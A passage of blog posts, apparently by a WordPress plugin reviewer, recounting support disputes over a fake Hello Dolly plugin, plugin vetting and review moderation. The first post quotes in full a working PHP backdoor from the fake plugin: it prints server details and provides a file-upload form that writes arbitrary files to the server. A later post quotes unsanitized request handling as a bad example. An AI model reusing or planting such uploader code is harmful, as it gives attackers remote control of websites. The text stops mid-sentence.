full_description = '''Tag: wordpress Plugins: Fake Plugins Are Your Fault Han (not his real name) emailed the plugin team to complain he was suspended by the forums team. […] But sometime in the last 12 months I had several sites attacked in which a Fake version of the Hello Dolly plugin was installed maliciously. Sadly as my post was deleted without warning or explanation any further details I could have given on the subject where lost along with the post. Now. Someone did reply to Han and told him that the fake plugin meant he had a vulnerability on his site, and here’s how you can look into that. Since his forum post included a code snippet, yes, it was removed after he was emailed about it. If it’s not hosted here, we don’t care That was, more or less, my mantra. It’s wrong, I very much do care, but I cannot do a blessed thing about other people’s sites. Still, we looked at the thread, and I was amused by the code: if(isset($_REQUEST['act'])){ echo '<b>'.php_uname().'</b><br>'; echo @file_get_contents('/location/server/version').'<br />'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input name="uploadto" type="text" size="80" value="'.getcwd().'"><br />'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_POST['uploadto'].'/'.$_FILES['file']['name'])) { echo '<b>Upload success!</b><br>'.$_POST['uploadto']."/".$_FILES['file']['name']; } else { echo '<b>Upload failed!</b>'; } } exit; } We replied that the code Han found on his server was not hosted on WordPress.org and, therefore, we could do nothing about it, here’s how you clean up your hacked site. You’re reporting that your sites have a vulnerability and someone is exploiting them. That they happen to use Hello Dolly to hide their malicious code is not something we could prevent. All we can tell you is that something on your sites is insecure and being used as a back door. Han disagreed: No the plugin was faking being hello dolly i don’t use it that’s how it was discovered. It installed itself and pretended to be hello dolly so yeah your problem coz it’s pretending to be one of your plugins That’s not how it works. I get why Han thought that, and in a way, it is a problem but … what can we do about it? We don’t know where the hack is from The hacker could have faked any plugin Of fucking course they’d fake a well known one people might ignore I’d love to be able to stop people from faking plugins, but there’s no way to even try. Fix Your Site We tried again: I’m sorry but you are incorrect in your understanding. The problem is not the Fake Hello Dolly, the problem is SOMETHING ELSE on your sites is vulnerable and that is being used by evil people to install the fake plugin. They could have named the fake plugin anything. They picked Hello Dolly because it’s common, but there’s nothing anyone can do to make them pick another name. There’s nothing we can do to help you here. Stop looking at the fake plugin as the source of your trouble and figure out what OTHER plugin or theme LET IT get installed. Or hire a security company to help you. Because you see the real issue is his sites keep getting hacked. So y’know, fix yourself. Or don’t you think it worth warning users to be aware of a threat that is branding itself as a WordPress product? I’m not asking you to fix anything. Im talking about something I found while patching security on someone else’s site sure they could have named it anything. But the code and everything about it was disguised to look a lot like Hello Dolly. All i wanted was to make someone aware but fine. Thanks I’ll know not to bother trying to help the community next time I see we’ve jumped over to ‘you won’t do what I want so I won’t ever help again’ — a common refrain. WordPress.org cannot stop people from being assholes So we tried again We understand what you’re trying to do. The reality is that there’s nothing we can do about this. It’s like people selling a fake Rolex watch. If we knew who it was, we could attempt to stop them. But knowing that it happens ‘somewhere’ out there and that someone fell for it? Well… we’re sorry and it sucks, but there’s nothing we can do about it. Someone made a fake Hello Dolly and hid bad code in it. They could have picked any plugin, even Yoast SEO, but even then Yoast would tell you there’s nothing they can do either. Of course Dolly was targeted. It’s on every single install. It’s like targeting Safari on a Mac. Ever Mac has it. It’s there. It’s used. Target it. All you’ve done here is tell us “Hey someone made a fake plugin and hid stuff in it.” Thank you, but there’s nothing we can do to stop it, and there’s nothing we can do to help people because the real issue isn’t whose plugin was faked, but how did that get installed in the first place. And that’s the job of a site security team. Unless the fake plugin is being distributed by WordPress.org, or the vulnerability that allowed it to be installed is in a plugin hosted on WordPress.org, this is outside our purview and we cannot assist you. At that point, Han accepted the point, but bitched we weren’t super kind at the start. Now here’s where it gets funny. Han claimed he never got the emails from the forums team, except he did. We know he did because he quoted one in his first email! So, since we knew he’d already been told things (like the plugin team cannot help you on code hosted outside of WordPress.org), we’d skipped that at the start of his email and that pissed him off. When this was pointed out, he claimed (again) to have not gotten the emails and didn’t know what to do. So we directed him to Slack and he opted to … not. Points to Remember? If a plugin is ‘hacked’ it’s likely a different plugin causing it and you can check because all the code on WordPress.org is open source and free to view. You can go look and say “Hmm. my copy of Hello Dolly doesn’t match!” That means the issue is not with the code hosted on WordPress.org, it’s something else! If it’s code you bought elsewhere, again, don’t complain to the Plugin Review Team, they can’t do jack. If it’s code you got from a nulled site, well you’re an idiot and don’t do that again. 21 May, 2024 Plugins: Do Better Gazzer (not his real name) had a somewhat decent point to make. He emailed plugins to complain about security: You guys (WP) should do a better job of screening and/or even certifying the plugins that are listed in your directory. I’m constantly receiving emails warning of security vulnerabilities associated with plugins. Also, I’m spending way too much time dealing with plugins that wreak havoc with my site (using up server resources, and carrying viruses). Maybe, you can experiment with a premium or “paid” plugin model. If Apple can do it with apps. then you guys can do it with plugins. Gazzer’s email This is a pretty common complaint. And it comes from a misconception I fully understand. We Don’t Do That The Plugin Review Team does not review every single release of every plugin. Considering the magnitude of the backlog today (over 400 and climbing) I think you all can see why. Reviewing a plugin takes time and it takes work and, if you’ve been reading this blog for a while, it takes mental fortitude not to scream “Just fucking enqueue your goddamn javascript you moron!” all the time. Ahem. I know that (at least at one point in time) the Theme Review Team did in fact review every release of every theme. I have often said that can work with themes because at their heart, they’re easier. Themes are themes. They ‘do’ the same thing in different ways. Plugins can be anything, do anything, and do it in any way possible. That divide id bigger than the Grand Canyon. We don’t screen or certify the plugins at all. We review new plugins when they are created, and advise authors about problems before hand. However, there are 1000+ updates to plugins every single day. We do not have anywhere near the manpower to review every single change. We are a hosting service. We host the plugins for authors. We do not verify them, we do not create them, and we do not own them. Each plugin is owned by its authors, and they are responsible for it. Plugin Team reply Gazzer didn’t like that. Try a Plugin Store! Gazzer felt we should address his suggestion and try a store. Obviously, it easier to point out what you DON’T do as compared to looking at my suggestion and addressing it. I mentioned, “Maybe, you can experiment with a premium or “paid” plugin model.” Security vulnerabilities and poorly designed plugins are a major problem for some of us. Besides, if you create revenue from charging developers for plugins that some of us would be willing to pay for (especially certified for security and reliability) then it’s a win, win. However, if it’s easier to talk about what you can’t do or won’t do then nevermind. I’ll continue to look elsewhere. So we pointed out: Plugin Review is a 100% volunteer org, no one gets paid Even CodeCanyon, who does have a paid/premium library doesn’t check every release No plans to do premium at this time (circa pre-Covid) The plan hasn’t changed. If if does, I would agitate for backpay for a decade of service, though. And By The Way … Instead of complaining about that anymore, Gazzer went on to vent about (checks notes) updates! Speaking of plugin and WP issues.. (see the screenshot). Why should I have to deal with the unknown consequences of this crap! Below: WTF! What the fuck is your plugin add-ons aren’t tested up to the latest version of WooCommerce and might conflict, and Woo is kindly warning you. Since we couldn’t figure out what was bad about that, we shrugged and didn’t reply. Gazzer sent a second reply with the exact same email, and we filed it away as well. Gaz can probably be UN-banned Of note, I think we could (and likely should if it hasn’t already) remove Gazzer’s ban. He was banned for simply not accepting the reality of life. If all you’re going to do is tell someone they’re wrong, over and over, they will stop listening to you. But in retrospect that’s a bit harsh. At the same time, he doesn’t seem to care and has ‘moved on.’ In fact, he nuked his account and his Slack account. Now. Should WordPress.org have a paid/premium service? No. Absolutely not. That would ruin a lot of things, and reviews would become a play for money instead of fixing the internet. Should someone have a service where they review plugins and give security reviews? A few exist, but one is a total asshole, three were bought out by major players, one thinks FUD sells better than actual checks, and the last one is Patchstack whom I love. 7 May, 2024 Plugins: Kick Rocks Once upon a time there was a company called WP Bins (not their real name). They had a plugin that was flagged by the forum folks for going batshit on a review, demanding to know the definition of a review. Schrödinger’s Review A review is a forum post of someone’s experience using your plugin. That’s it. We ask people to be honest and fair, to use nicer language, but really there aren’t too many limits. This tends to result in developers angry due to subpar/uninformative reviews. I really get that. Getting a review of “This doesn’t work” sucks, and it’s as useful as tits on a snake. But the thing is, a review is someone’s experience. They can be wrong sometimes (like if they blame your plugin for something that isn’t your fault) but in general reviews are not malicious — they are either really happy or really angry. WP Bins reached out to complain about a ‘non’ review: It is someone crying because they have to pay extra for functionality included in the free version. This is not a review based on our product or what it can do, it is someone crying that we have the audacity to charge for the time/effort/resources spent to offer it to them. We took a look and saw the review was a complaint that functionality they need isn’t in the free version. Which, you know, annoying, but valid. That’s a complaint. And the developer is free to say “We know, it’s not going to be free.” I have often said the way in which you reply to a review is more important than the review, and Bins was a great example of that. The first comment was fine (basically saying “As our website states, those features are premium”). It was a bit snarky, but in the RTFM (read the fine/fucking material) kind of way. But Bins also flagged the review for moderation. A mod stepped in, explained sorry, it’s a valid review, and that’s where we went off the rails. And By The Way … Bins and the Mods got into a pissing match of “It is a review!”/”It’s not a review!” until the Mods put their foot down and said “You asked us to look, we did, it stands.” Sometimes you don’t get what you want. Then Bins escalated to Plugins. We went in, cleaned up the (public) argument about if it was/wasn’t a review, explained we were doing so to protect Bins from their own frustration (which we understood completely) and then checked out the plugin. This was the risk any time someone asked me to look at their forum drama. I always checked their plugins, because invariably the people who were the bitchiest about unfair reviews were breaking guidelines. Bins was: Prompting users for a license, claiming it was required for updates Emailing users on activation/deactivation Not sanitizing The first one was assumed to be a gaff. That is, they meant to say a license was needed for premium updates. Their methodology ran afoul of the guidelines, so it was explained how to correct that. The email they were told to review. The sanitizing was a requirement. And we’re talking basic stuff here: 'zip' => ( isset( $_POST['premium_addon_zip'] ) ) ? $_POST['premium_addon_zip'] : '', 'slug' => $_REQUEST['plugin_slug'], Kick Rocks That’s when they got mad. We will not be reopening the plugin on the WP repository if you can’t accept the fact that reviews are for reviewing products. And, if you cant accept that leaving one star (as oppose to 2 or 3) SOLELY because we have a premium version, well, is petty and childish (to use your lingo). We don’t need the WP repo. We did it for users and to be part of the “community”. But if this is how the community responds to our philanthropy, then kick rocks! Go ahead and pull the plugin. I will note, we absolutely told Bins they were being petty and childish over a single one star review. He was being a truculent toddler. And before we could reply: If you are willing to delete my reply because of protecting me, then why couldn’t you delete theirs? You even mentioned that it was a piss poor review and hard to tell what the hell they are saying. So, why would you leave that up? I don’t need you to take down my responses. My response was sound. We have a great user base and people that can actually read what we put out the for them. Including the price structure and our model. So, leaving his comm'''
